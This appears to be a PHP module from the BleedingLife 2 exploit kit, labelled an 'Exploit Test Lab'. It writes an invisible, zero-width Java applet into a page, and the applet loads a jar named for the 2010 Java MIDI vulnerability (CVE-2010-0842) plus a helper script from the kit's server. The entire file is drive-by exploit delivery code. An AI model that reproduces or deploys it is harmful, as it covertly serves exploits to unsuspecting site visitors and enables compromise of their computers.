<?
/*
BleedingLife 2 - Exploit Test Lab
Copyright (C) 2011 Blackhat Academy

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

include_once("config.php");

?>
	<Applet Code="MIDIExample.class" archive="<? echo $config_url . '/modules/helpers/Java-2010-0842.jar'; ?>" width="0" Height="1">	
	 <PARAM NAME="File" VALUETYPE="ref" VALUE="<? echo $config_url . '/modules/helpers/Java-2010-0842Helper.php'; ?>"> 
	</applet>
<?

?>
